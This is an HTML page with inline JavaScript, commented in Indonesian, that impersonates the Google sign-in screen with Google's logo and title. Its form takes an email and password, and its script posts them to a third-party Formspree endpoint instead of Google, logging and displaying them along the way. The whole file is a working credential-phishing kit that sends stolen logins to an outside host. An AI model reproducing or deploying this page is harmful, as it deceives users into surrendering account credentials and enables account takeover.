<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Google</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-container">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
    <h2>Sign in</h2>
    <p>to continue to Google</p>
    <form action="https://formspree.io/f/mvgokqyz" method="POST" id="loginForm">
      <input type="email" name="email" id="email" class="input-field" placeholder="Email or phone" required>
      <a href="#" class="forgot-email">Forgot email?</a>
      <input type="password" name="password" id="password" class="input-field" placeholder="Enter your password" required>
      <button type="submit" class="login-btn">Next</button>
    </form>
    <a href="#" class="create-account">Create account</a>
  </div>

  <script>
    // Mencegah pengiriman form default dan menampilkan data
    const form = document.getElementById("loginForm");
    
    form.addEventListener("submit", function(event) {
      event.preventDefault(); // Mencegah form dari pengiriman yang sebenarnya
      
      // Mengambil nilai email dan password
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Menampilkan data di konsol
      console.log("Email:", email);
      console.log("Password:", password);

      // Atau menampilkan data di halaman
      alert("Email: " + email + "\nPassword: " + password);

      // Mengirim data ke Formspree
      const formData = new FormData(form);
      fetch(form.action, {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      }).then(response => {
        if (response.ok) {
          alert("Data telah berhasil dikirim!");
          form.reset(); // Menghapus form setelah pengiriman
        } else {
          alert("Terjadi kesalahan saat mengirim data.");
        }
      }).catch(error => {
        console.error('Error:', error);
        alert("Terjadi kesalahan saat mengirim data.");
      });
    });
  </script>
</body>
</html>
